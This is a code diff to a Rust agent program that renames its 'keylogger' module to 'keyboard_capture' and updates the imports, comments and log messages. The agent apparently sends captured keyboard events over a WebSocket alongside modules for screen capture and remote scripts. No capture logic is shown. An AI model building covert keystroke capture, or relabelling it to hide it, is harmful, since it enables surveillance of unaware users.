@@ -53,7 +53,7 @@ mod app_display;
 mod capture;
 mod config;
 mod input;
-mod keylogger;
+mod keyboard_capture;
 mod remote_script;
 mod software_inventory;
 mod system_info;
@@ -72,7 +72,7 @@ use std::time::Duration;
 use anyhow::{Context, Result};
 use futures_util::{SinkExt, StreamExt};
 use input::InputController;
-use keylogger::InputEvent;
+use keyboard_capture::InputEvent;
 use tokio::sync::mpsc;
 use tokio::time::{interval, interval_at, Instant, MissedTickBehavior};
 use tokio_tungstenite::{
@@ -220,7 +220,7 @@ fn main() {
     };
     let (config_tx, config_rx) = tokio::sync::watch::channel(initial_watch);
 
-    // ── Synchronisation: wait for the keylogger hook to be installed ──────
+    // ── Synchronisation: wait for the keyboard hook to be installed ───────
     let (ready_tx, ready_rx) = std::sync::mpsc::channel::<anyhow::Result<()>>();
 
     // ── Background thread: Tokio runtime + agent WebSocket loop ──────────
@@ -236,17 +236,17 @@ fn main() {
                 .expect("Failed to build Tokio runtime");
 
             rt.block_on(async move {
-                // Keylogger channels must be created inside the async context
-                // because keylogger::start() spawns a tokio task internally.
+                // Keyboard capture channels must be created inside the async context
+                // because keyboard_capture::start() spawns a tokio task internally.
                 let (key_tx, key_rx) = mpsc::unbounded_channel::<InputEvent>();
-                match keylogger::start(key_tx) {
+                match keyboard_capture::start(key_tx) {
                     Ok(()) => {
                         info!("Keyboard hook installed.");
                         let _ = ready_tx.send(Ok(()));
                     }
                     Err(e) => {
                         let _ = ready_tx.send(Err(anyhow::anyhow!("{e:#}")));
-                        return; // Cannot continue without keylogger
+                        return; // Cannot continue without keyboard capture
                     }
                 }
 
@@ -265,11 +265,11 @@ fn main() {
         })
         .expect("Failed to spawn agent thread");
 
-    // Block until the keylogger hook is ready (or failed)
+    // Block until the keyboard hook is ready (or failed)
     match ready_rx.recv() {
         Ok(Ok(())) => {}
-        Ok(Err(e)) => warn!("Keylogger failed to start: {e:#}"),
-        Err(_) => warn!("Agent thread exited before keylogger was ready"),
+        Ok(Err(e)) => warn!("Keyboard capture failed to start: {e:#}"),
+        Err(_) => warn!("Agent thread exited before keyboard hook was ready"),
     }
 
     if no_ui {
